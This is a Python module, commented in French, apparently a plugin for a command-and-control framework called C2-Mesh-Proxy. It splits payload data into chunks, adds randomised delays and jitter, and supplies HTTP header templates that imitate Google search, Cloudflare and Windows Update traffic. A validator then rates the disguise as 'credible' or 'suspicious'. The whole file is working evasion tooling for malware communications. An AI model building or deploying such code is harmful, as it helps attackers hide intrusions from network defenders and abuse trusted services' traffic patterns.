"""
traffic_shaper — C2-Mesh-Proxy (shaping) / Traffic shaping.
Mise en forme du trafic C2: packetisation, jitter, delais aleatoires,
mimétisme HTTP, chunking. Multi-plateforme, stdlib.
Actions: shape, chunk, template, validate
"""
NAME = "traffic_shaper"
VERSION = "1.0.0"
DESCRIPTION = "Shaping de trafic: packetisation, jitter, mimétisme HTTP pour C2."
AUTHOR = "lucy"
DEPENDENCIES = []
OS_COMPAT = ["windows", "linux", "darwin"]

import base64
import hashlib
import json
import random
import time


def _result(data=None, error=None, status="completed"):
    return {"status": status, "data": data, "error": error}


def run(action, params):
    try:
        if action == "shape":
            return _shape(params)
        if action == "chunk":
            return _chunk(params)
        if action == "template":
            return _template(params)
        if action == "validate":
            return _validate(params)
        return _result(error="Unknown action: " + str(action), status="failed")
    except Exception as exc:
        return _result(error="traffic_shaper: " + str(exc), status="failed")


def _shape(params):
    data = params.get("data", "")
    try:
        blob = base64.b64decode(data)
    except Exception:
        blob = data.encode()
    chunk_size = int(params.get("chunk_size", 0))
    delay = float(params.get("delay", 0.0))
    jitter = float(params.get("jitter", 0.0))
    out = []
    if chunk_size > 0:
        parts = [blob[i:i + chunk_size] for i in range(0, len(blob), chunk_size)]
    else:
        parts = [blob]
    for p in parts:
        out.append({"chunk": base64.b64encode(p).decode(),
                    "size": len(p),
                    "seq": hashlib.sha256(p).hexdigest()[:8],
                    "ts": int(time.time() * 1000)})
        if delay:
            time.sleep(max(0.0, delay + random.uniform(-jitter, jitter)))
    return _result(data={"packets": out, "count": len(out),
                         "total": len(blob)})


def _chunk(params):
    data = params.get("data", "")
    try:
        blob = base64.b64decode(data)
    except Exception:
        blob = data.encode()
    size = int(params.get("size", 512))
    if size <= 0:
        return _result(error="size must be positive", status="failed")
    parts = [blob[i:i + size] for i in range(0, len(blob), size)]
    return _result(data={"chunks": [base64.b64encode(p).decode() for p in parts],
                         "count": len(parts), "size": size})


_TEMPLATES = {
    "google": {
        "headers": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                    "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "Accept-Language": "en-US,en;q=0.9",
                    "Referer": "https://www.google.com/"},
        "path": "/search?q=",
    },
    "cloudflare": {
        "headers": {"User-Agent": "curl/8.5.0",
                    "Accept": "*/*",
                    "Accept-Encoding": "gzip, deflate, br",
                    "CF-Connecting-IP": "203.0.113.7"},
        "path": "/cdn-cgi/trace",
    },
    "msupdate": {
        "headers": {"User-Agent": "Microsoft-Windows/6.3 UpdateClient/10.0.22621.1",
                    "Content-Type": "application/soap+xml; charset=utf-8",
                    "Accept": "application/soap+xml"},
        "path": "/wsus/",
    },
}


def _template(params):
    name = params.get("name", "google")
    tpl = _TEMPLATES.get(name.lower())
    if not tpl:
        return _result(error="Unknown template: " + name, status="failed")
    return _result(data={"template": name, "headers": tpl["headers"],
                         "path": tpl["path"]})


def _validate(params):
    headers = params.get("headers", {})
    checks = []
    ua = headers.get("User-Agent", "")
    if not ua or len(ua) < 20:
        checks.append({"check": "User-Agent", "ok": False,
                       "detail": "UA manquant ou trop court"})
    else:
        checks.append({"check": "User-Agent", "ok": True})
    if not headers.get("Accept"):
        checks.append({"check": "Accept", "ok": False})
    else:
        checks.append({"check": "Accept", "ok": True})
    score = sum(1 for c in checks if c["ok"]) / max(1, len(checks))
    return _result(data={"checks": checks, "score": round(score, 2),
                         "recommendation": "credible" if score >= 0.5 else "suspicious"})
